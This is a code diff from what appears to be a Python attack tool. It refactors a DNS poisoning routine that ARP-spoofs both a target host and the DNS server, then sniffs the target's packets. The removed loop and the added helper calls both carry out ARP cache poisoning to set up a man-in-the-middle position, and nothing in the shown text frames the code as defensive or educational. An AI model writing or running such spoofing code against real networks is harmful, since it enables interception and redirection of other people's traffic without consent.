@@ -68,16 +68,6 @@ def dns_pkt_check(pkt):
         fwd_pkt(pkt)
 
 
-def arp_for_dns_spoof_loop(ip, mac, spoofed_ip):
-    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
-    i = 0
-    while i in range(10):
-        arp_spoof(ip, mac, spoofed_ip)
-        time.sleep(1)
-        i+=1
-    print("ARP Poison to %s complete" % ip)
-
-
 def start_dns_poison(cmd):
     args = shlex.split(cmd)
     tgtip = spoofed_addr = dom = None
@@ -108,13 +98,9 @@ def start_dns_poison(cmd):
 
     get_gateway()
 
-    arp_thread_gws = threading.Thread(target=arp_for_dns_spoof_loop, args=(dns_server_ip, host_mac_addr, tgtip))
-    arp_thread_gws.daemon = True
-    arp_thread_gws.start()
+    start_arp_thread(dns_server_ip, host_mac_addr, tgtip, 10)
 
-    arp_thread_tgt = threading.Thread(target=arp_for_dns_spoof_loop, args=(tgtip, host_mac_addr, dns_server_ip))
-    arp_thread_tgt.daemon = True
-    arp_thread_tgt.start()
+    start_arp_thread(tgtip, host_mac_addr, dns_server_ip, 10)
 
     sniff(store = 0, filter="src host " + str(tgtip), iface = iface, prn = lambda x: dns_pkt_check(x))
 
